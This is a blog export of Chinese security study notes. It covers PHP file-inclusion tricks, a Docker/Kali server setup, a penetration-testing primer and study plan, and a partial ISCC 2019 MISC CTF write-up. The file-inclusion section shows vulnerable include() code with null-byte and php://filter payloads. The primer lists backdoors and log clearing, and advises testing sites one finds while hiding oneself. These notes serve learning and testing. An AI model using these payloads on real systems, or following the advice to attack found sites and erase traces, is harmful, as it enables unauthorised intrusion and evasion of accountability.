title="字符串截断"></a>字符串截断</h2><p>%00空字符截断：【PHP版本小于5.3】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;].&#x27;.php&#x27;);</span><br><span class="line"></span><br><span class="line">//1.php?file=2.txt%00</span><br><span class="line"></span><br><span class="line">//2.txt里面是 &lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="iconv函数字符编码转换截断：【对PHP版本有要求】"><a href="#iconv函数字符编码转换截断：【对PHP版本有要求】" class="headerlink" title="iconv函数字符编码转换截断：【对PHP版本有要求】"></a>iconv函数字符编码转换截断：【对PHP版本有要求】</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">chr(128)—chr(255)可以截断字符</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &#x27;1&#x27;.chr(130).&#x27;2’;</span><br><span class="line"></span><br><span class="line">echo $a.&quot;&lt;br&gt;&quot;; //12</span><br><span class="line"></span><br><span class="line">echo iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $a); //1</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php:&#x2F;&#x2F; 输入输出流"></a>php:&#x2F;&#x2F; 输入输出流</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[‘file&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode(内容被base64编码)&#x2F; resource&#x3D;example.txt(远程文件)</p><h2 id="php代码解析标签"><a href="#php代码解析标签" class="headerlink" title="php代码解析标签"></a>php代码解析标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a &lt;script language=&quot;php&quot;&gt;…&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">b &lt;?…?&gt;：php3.0.4版本后可用</span><br><span class="line"></span><br><span class="line">c &lt;%…%&gt;：asp标签，需要asp_tags=on，默认是 oﬀ </span><br></pre></td></tr></table></figure><p>正则表达式：</p><p>a 没有使用^ 和 $ 限定匹配开始位置：</p><p>b 特殊字符未转义：</p><p>报错注入：</p><p>windows findfirstfile<br>利用：<br>若要搜索12345.txt文件，可使用1&lt;&lt;来代替或者12&lt;&lt;，不可以单独使用一个”&lt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Setting Up an Intranet Server Using Docker</title>
      <link href="/2019/05/14/Setting-Up-an-Intranet-Server-Using-Docker/"/>
      <url>/2019/05/14/Setting-Up-an-Intranet-Server-Using-Docker/</url>
      
        <content type="html"><![CDATA[<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="几条重要的命令"><a href="#几条重要的命令" class="headerlink" title="几条重要的命令"></a>几条重要的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动           systemctl start docker</span><br><span class="line">守护进程重启 sudo systemctl daemon-reload</span><br><span class="line">列出容器        docker ps </span><br><span class="line">显示所有的容器，包括未运行的  docker ps -a</span><br><span class="line">重启docker服务  systemctl restart  docker</span><br><span class="line">重启docker服务  sudo service docker restart</span><br><span class="line">关闭docker      service docker stop   </span><br><span class="line">关闭docker      systemctl stop docker</span><br></pre></td></tr></table></figure><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><h4 id="通过桥接模式，搭建可通过外网访问的内网服务器"><a href="#通过桥接模式，搭建可通过外网访问的内网服务器" class="headerlink" title="通过桥接模式，搭建可通过外网访问的内网服务器"></a>通过桥接模式，搭建可通过外网访问的内网服务器</h4><p><strong>步骤</strong></p><ol><li>在 kali 中安装 docker</li><li>docker pull 下载镜像</li><li>配置静态ip</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ifconfig 查看当前网卡</span><br><span class="line">service networking stop 停止当前网卡网络服务</span><br><span class="line">vi /etc/network/interfaces 对网卡配置进行修改</span><br><span class="line">进去之后，你会发现这个界面内容</span><br><span class="line">································</span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0 网卡</span><br><span class="line">#iface eth0 inet dhcp</span><br><span class="line">iface eth0 inet static  启用静态ip</span><br><span class="line">address 192.168.31.108  设置ip地址</span><br><span class="line">netmask 255.255.255.0   子网掩码</span><br><span class="line">gateway 192.168.31.1    网关</span><br><span class="line">·······························</span><br><span class="line">ESC :wq!</span><br><span class="line">service networking restart 重启网络服务</span><br></pre></td></tr></table></figure><p>4.虚拟机本地访问127.0.0.1测试<br>5.改防火墙权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ufw</span><br><span class="line">关闭  ufw disable</span><br><span class="line">开启  ufw enable</span><br></pre></td></tr></table></figure><p>6.连接ssh，down源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssh hostname@ip -p xxxx 端口指向</span><br><span class="line">进入www目录（举例）</span><br><span class="line">cd /var/www/html</span><br><span class="line">打包html</span><br><span class="line">tar -cvf html.tar html </span><br><span class="line">移动html.tar到html</span><br><span class="line">mv html.tar html</span><br><span class="line">删除</span><br><span class="line">rm -f  强行删除某个文件</span><br><span class="line">rm -r  向下递归，不管有多少级目录，一并删除</span><br><span class="line">rm -rf 将会删除目录以及其下所有文件、文件夹</span><br><span class="line">访问ip/html.tar即可下载</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Penetration Testing</title>
      <link href="/2019/05/14/Introduction-to-Penetration-Testing/"/>
      <url>/2019/05/14/Introduction-to-Penetration-Testing/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h2><h3 id="基于百度搜索引擎得到的结果"><a href="#基于百度搜索引擎得到的结果" class="headerlink" title="基于百度搜索引擎得到的结果"></a>基于百度搜索引擎得到的结果</h3><p>渗透测试（Penetration Test）是一种黑盒安全测试方法，安全专家通过模拟真实黑客的技术手段对目标进行漏洞检测，突破系统的安全防护手段，深入评估漏洞所可能造成的实际影响。</p><h2 id="渗透测试与入侵的区别"><a href="#渗透测试与入侵的区别" class="headerlink" title="渗透测试与入侵的区别"></a>渗透测试与入侵的区别</h2><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>以安全为基本原则，通过攻击者以及防御者的角度去分析目标所存在的安全隐患以及脆弱性，以保护系统安全为最终目标。</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>通过各种方法，甚至破坏性的操作，来获取系统权限以及各种敏感信息。</p><h3 id="一般的渗透测试流程：-基于Freebuf"><a href="#一般的渗透测试流程：-基于Freebuf" class="headerlink" title="一般的渗透测试流程：(基于Freebuf)"></a>一般的渗透测试流程：(基于Freebuf)</h3><p>1.明确目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">确定范围：测试目标的范围、ip、域名、内外网、测试账户。</span><br><span class="line"></span><br><span class="line">确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。</span><br><span class="line"></span><br><span class="line">确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞、等等。</span><br></pre></td></tr></table></figure><p>2.信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">方式：主动扫描，开放搜索等。</span><br><span class="line"></span><br><span class="line">开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。</span><br><span class="line"></span><br><span class="line">基础信息：IP、网段、域名、端口。</span><br><span class="line"></span><br><span class="line">应用信息：各端口的应用。例如web应用、邮件应用、等等。</span><br><span class="line"></span><br><span class="line">系统信息：操作系统版本</span><br><span class="line"></span><br><span class="line">版本信息：所有这些探测到的东西的版本。</span><br><span class="line"></span><br><span class="line">服务信息：中间件的各类信息，插件信息。</span><br><span class="line"></span><br><span class="line">人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。</span><br><span class="line"></span><br><span class="line">防护信息：试着看能否探测到防护设备。</span><br></pre></td></tr></table></figure><p>3.漏洞探测</p><p>利用上一步中列出的各种系统，应用等使用相应的漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line"></span><br><span class="line">(1)   漏扫，awvs，IBM appscan等。</span><br><span class="line"></span><br><span class="line">(2)   结合漏洞去exploit-db等位置找利用。</span><br><span class="line"></span><br><span class="line">(3)   在网上寻找验证poc。</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line"></span><br><span class="line">系统漏洞：系统没有及时打补丁</span><br><span class="line"></span><br><span class="line">WebSever漏洞：WebSever配置问题</span><br><span class="line"></span><br><span class="line">Web应用漏洞：Web应用开发问题</span><br><span class="line"></span><br><span class="line">其它端口服务漏洞：各种21/8080(st2)/7001/22/3389</span><br><span class="line"></span><br><span class="line">通信安全：明文传输，token在cookie中传送等。</span><br></pre></td></tr></table></figure><p>4.漏洞验证</p><p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">自动化验证：结合自动化扫描工具提供的结果</span><br><span class="line"></span><br><span class="line">手工验证，根据公开资源进行验证</span><br><span class="line"></span><br><span class="line">试验验证：自己搭建模拟环境进行验证</span><br><span class="line"></span><br><span class="line">登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</span><br><span class="line"></span><br><span class="line">业务漏洞验证：如发现业务漏洞，要进行验证</span><br></pre></td></tr></table></figure><p>公开资源的利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exploit-db/wooyun/</span><br><span class="line"></span><br><span class="line">google hacking</span><br><span class="line"></span><br><span class="line">渗透代码网站</span><br><span class="line"></span><br><span class="line">通用、缺省口令</span><br><span class="line"></span><br><span class="line">厂商的漏洞警告等等。</span><br></pre></td></tr></table></figure><p>5.信息分析<br>为下一步实施渗透做准备。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">精准打击：准备好上一步探测到的漏洞的exp，用来精准打击</span><br><span class="line"></span><br><span class="line">绕过防御机制：是否有防火墙等设备，如何绕过</span><br><span class="line"></span><br><span class="line">定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</span><br><span class="line"></span><br><span class="line">绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</span><br><span class="line"></span><br><span class="line">攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</span><br></pre></td></tr></table></figure><p>6.获取所需<br>实施攻击：根据前几步的结果，进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</span><br><span class="line"></span><br><span class="line">进一步渗透：内网入侵，敏感目标</span><br><span class="line"></span><br><span class="line">持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</span><br><span class="line"></span><br><span class="line">清理痕迹：清理相关日志（访问，操作），上传文件等</span><br></pre></td></tr></table></figure><p>7.信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整理渗透工具：整理渗透过程中用到的代码，poc，exp等</span><br><span class="line"></span><br><span class="line">整理收集信息：整理渗透过程中收集到的一切信息</span><br><span class="line"></span><br><span class="line">整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</span><br></pre></td></tr></table></figure><p>8.形成报告</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</span><br><span class="line"></span><br><span class="line">补充介绍：要对漏洞成因，验证过程和带来危害进行分析</span><br><span class="line"></span><br><span class="line">修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</span><br></pre></td></tr></table></figure><h3 id="学习规划-基于CnHacker"><a href="#学习规划-基于CnHacker" class="headerlink" title="学习规划: (基于CnHacker)"></a>学习规划: (基于CnHacker)</h3><p>基础：Web安全相关概念</p><blockquote><p>熟悉基本概念（SQL注入、上传、XSS、CSRF、一句话木马等）.</p></blockquote><blockquote><p>通过关键字（SQL注入、上传、XSS、CSRF、一句话木马等）进行Google&#x2F;SecWiki；</p></blockquote><blockquote><p>阅读《精通脚本黑客》，虽然很旧也有错误，但是入门还是可以的；</p></blockquote><blockquote><p>看一些渗透笔记&#x2F;视频，了解渗透实战的整个过程，可以Google（渗透笔记、渗透过程、入侵过程等）；</p></blockquote><p>3周<br>熟悉渗透相关工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">熟悉AWVS、sqlmap、Burp、nessus、chopper、nmap、Appscan等相关工具的使用。</span><br><span class="line">了解该类工具的用途和使用场景，先用软件名字Google/SecWiki；</span><br><span class="line">下载无后们版的这些软件进行安装；</span><br><span class="line">学习并进行使用，具体教材可以在SecWiki上搜索，例如：Brup的教程、sqlmap；</span><br><span class="line">待常用的这几个软件都学会了可以安装音速启动做一个渗透工具箱；</span><br></pre></td></tr></table></figure><p>5周<br>渗透实战操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">掌握渗透的整个阶段并能够独立渗透小型站点。</span><br><span class="line">网上找渗透视频看并思考其中的思路和原理，关键字（渗透、SQL注入视频、文件上传入侵、数据库备份、dedecms漏洞利用等等）；</span><br><span class="line">自己找站点/搭建测试环境进行测试，记住请隐藏好你自己；</span><br><span class="line">思考渗透主要分为几个阶段，每个阶段需要做那些工作，例如这个：PTES渗透测试执行标准；</span><br><span class="line">研究SQL注入的种类、注入原理、手动注入技巧；</span><br><span class="line">研究文件上传的原理，如何进行截断、双重后缀欺骗(IIS、PHP)、解析漏洞利用（IIS、Nignix、Apache）等，参照：上传攻击框架；</span><br><span class="line">研究XSS形成的原理和种类，具体学习方法可以Google/SecWiki，可以参考：XSS；</span><br><span class="line">研究Windows/Linux提权的方法和具体使用，可以参考：提权；</span><br><span class="line">可以参考: 开源渗透测试脆弱系统；</span><br></pre></td></tr></table></figure><p>1周<br>关注安全圈动态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">关注安全圈的最新漏洞、安全事件与技术文章。</span><br><span class="line">通过SecWiki浏览每日的安全技术文章/事件；</span><br><span class="line">通过Weibo/twitter关注安全圈的从业人员（遇到大牛的关注或者好友果断关注），天天抽时间刷一下；</span><br><span class="line">通过feedly/鲜果订阅国内外安全技术博客（不要仅限于国内，平时多注意积累），没有订阅源的可以看一下SecWiki的聚合栏目；</span><br><span class="line">养成习惯，每天主动提交安全技术文章链接到SecWiki进行积淀；</span><br><span class="line">多关注下最新漏洞列表，推荐几个：exploit-db、CVE中文库、Wooyun等，遇到公开的漏洞都去实践下。</span><br><span class="line">关注国内国际上的安全会议的议题或者录像，推荐SecWiki-Conference。</span><br></pre></td></tr></table></figure><p>3周<br>熟悉Windows&#x2F;Kali Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">学习Windows/Kali Linux基本命令、常用工具；</span><br><span class="line">熟悉Windows下的常用的cmd命令，例如：ipconfig,nslookup,tracert,net,tasklist,taskkill等；</span><br><span class="line">熟悉Linux下的常用命令，例如：ifconfig,ls,cp,mv,vi,wget,service,sudo等；</span><br><span class="line">熟悉Kali Linux系统下的常用工具，可以参考SecWiki,《Web Penetration Testing with Kali Linux》、《Hacking with Kali》等；</span><br><span class="line">熟悉metasploit工具，可以参考SecWiki、《Metasploit渗透测试指南》。</span><br></pre></td></tr></table></figure><p>3周<br>服务器安全配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">学习服务器环境配置，并能通过思考发现配置存在的安全问题。</span><br><span class="line">Windows2003/2008环境下的IIS配置，特别注意配置安全和运行权限，可以参考：SecWiki-配置；</span><br><span class="line">Linux环境下的LAMP的安全配置，主要考虑运行权限、跨目录、文件夹权限等，可以参考：SecWiki-配置；</span><br><span class="line">远程系统加固，限制用户名和口令登陆，通过iptables限制端口；</span><br><span class="line">配置软件Waf加强系统安全，在服务器配置mod_security等系统，参见SecWiki-ModSecurity；</span><br><span class="line">通过Nessus软件对配置环境进行安全检测，发现未知安全威胁。</span><br></pre></td></tr></table></figure><p>4周<br>脚本编程学习</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">选择脚本语言Perl/Python/PHP/Go/Java中的一种，对常用库进行编程学习。</span><br><span class="line">搭建开发环境和选择IDE，PHP环境推荐Wamp和XAMPP，IDE强烈推荐Sublime，一些Sublime的技巧：SecWiki-Sublime；</span><br><span class="line">Python编程学习，学习内容包含：语法、正则、文件、网络、多线程等常用库，推荐《Python核心编程》，不要看完；</span><br><span class="line">用Python编写漏洞的exp，然后写一个简单的网络爬虫，可参见SecWiki-爬虫、视频；</span><br><span class="line">PHP基本语法学习并书写一个简单的博客系统，参见《PHP与MySQL程序设计（第4版）》、视频；</span><br><span class="line">熟悉MVC架构，并试着学习一个PHP框架或者Python框架（可选）；</span><br><span class="line">了解Bootstrap的布局或者CSS，可以参考：SecWiki-Bootstrap;</span><br></pre></td></tr></table></figure><p>3周 源码审计与漏洞分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">能独立分析脚本源码程序并发现安全问题。</span><br><span class="line">熟悉源码审计的动态和静态方法，并知道如何去分析程序，参见SecWiki-审计；</span><br><span class="line">从Wooyun上寻找开源程序的漏洞进行分析并试着自己分析；</span><br><span class="line">了解Web漏洞的形成原因，然后通过关键字进行查找分析，参见SecWiki-代码审计、高级PHP应用程序漏洞审核技术；</span><br><span class="line">研究Web漏洞形成原理和如何从源码层面避免该类漏洞，并整理成checklist。</span><br></pre></td></tr></table></figure><p>5周<br>安全体系设计与开发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">能建立自己的安全体系，并能提出一些安全建议或者系统架构。</span><br><span class="line">开发一些实用的安全小工具并开源，体现个人实力；</span><br><span class="line">建立自己的安全体系，对公司安全有自己的一些认识和见解；</span><br><span class="line">提出或者加入大型安全系统的架构或者开发；</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC 2019-MISC</title>
      <link href="/2019/05/14/ISCC2019-MISC/"/>
      <url>/2019/05/14/ISCC2019-MISC/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>进制——&gt;ASCII——&gt;base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113&#x27;</span></span><br><span class="line">tmp = <span class="built_in">str</span>.split( )</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>StegSolve——&gt;data analyze——&gt;字符颠倒<br><a href="https://i.loli.net/2019/05/06/5ccfd01f95d4e.png" title="倒立屋"><img src="https://i.loli.net/2019/05/06/5ccfd01f95d4e.png" alt="倒立屋" title="倒立屋"></a><br>将图片在Steg中数据分析调至最低位，会发现第一行有一串很像flag的字符，尝试提交报错，更改格式报错，再结合题目，倒立屋，尝试将字符串颠倒过来提交，即按从右往左的顺序，发现对了（这道题的flag有点东西）</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>提取——&gt;联想——&gt;比划<br>在附件中我们发现有{}，不难猜到肯定是flag，我们进行提取得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU&#125;</span><br></pre></td></tr></table></figure><p>这么长一串，但是看起来又不像加密过的，回到原题“Keyes’ secret”，联想一下,key会不会是keyboard,再观察提取的字符，突然发现这些字母连起来在键盘上画出来是会是其他的字母形状，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WSX----------------------I</span><br><span class="line">IUYHNBV---------------S</span><br><span class="line">TRFVB------------------C</span><br><span class="line">QAZSEC----------------K</span><br><span class="line">WSXCDE---------------E</span><br><span class="line">EFVT---------------------Y</span><br><span class="line">YHNMKJ----------------B</span><br><span class="line">TGBNMJU--------------O</span><br><span class="line">GRDXCVB--------------A</span><br><span class="line">MNBVCDRTGHU-----R</span><br><span class="line">WSXCFE----------------D</span><br><span class="line">NBVCXSWERF--------P</span><br><span class="line">RFVGYHN--------------H</span><br><span class="line">MNBVCDRTGHU-----R</span><br></pre></td></tr></table></figure><p>以上就是键盘中的秘密</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>题目——&gt;winhex——&gt;AES+key解密<br>观察题目有三个比较敏感的字母AES，不难猜到这道题是AES解码，既然解码就要找到密文，故我们将GIF动图放到winhex中，发现最低端有一行特立独行的密文，<a href="https://i.loli.net/2019/05/06/5ccfd67f8f4a4.png" title="winhex"><img src="https://i.loli.net/2019/05/06/5ccfd67f8f4a4.png" alt="winhex" title="winhex"></a><br>进行解码，发现需要提供key,猜想这是什么比赛，哦,ISCC，尝试设置为ISCC，解码，<br><a href="https://i.loli.net/2019/05/06/5ccfd6b00c2cb.png" title="AES"><img src="https://i.loli.net/2019/05/06/5ccfd6b00c2cb.png" alt="AES" title="AES"></a>发现成功了，再次进行解码，得到flag</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>binwalk——&gt;python3<br>用过很多信息隐藏提取的工具都没有用，经过尝试，发现binwalk可以将此图分离<br><a href="https://i.loli.net/2019/05/06/5cd035b040d11.png" title="binwalk"><img src="https://i.loli.net/2019/05/06/5cd035b040d11.png" alt="binwalk" title="binwalk"></a><br>得到10个碎片图<br>并且得到一张说明提示</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？</span><br><span class="line"></span><br><span class="line">我去问了欧鹏·曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。</span><br></pre></td></tr></table></figure><p>附脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 